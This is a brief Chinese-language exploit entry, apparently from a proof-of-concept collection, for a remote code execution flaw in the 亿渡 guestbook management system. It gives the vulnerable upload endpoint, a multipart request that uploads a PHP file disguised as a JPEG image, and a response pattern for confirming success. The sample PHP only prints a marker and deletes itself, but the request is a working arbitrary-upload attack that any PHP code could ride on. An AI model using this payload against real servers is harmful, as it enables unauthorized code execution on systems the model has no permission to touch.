# 亿渡留言管理系统RCE

亿渡留言管理系统 ｜ 命令执行 ｜ —
- **请求**：`POST /plugins/upload/uploadimg.php?fp=upimg HTTP/1.1`

**Payload**
```
------WebKitFormBoundarypvPqblfrUine6bl3
Content-Disposition: form-data; name="file"; filename="dudesite.php"
Content-Type: image/jpeg
<?php echo "12321";unlink(__FILE__); ?>
------WebKitFormBoundarypvPqblfrUine6bl3--
```
- **响应特征**：200 ^(?=.*?code)(?=.*?0).*?$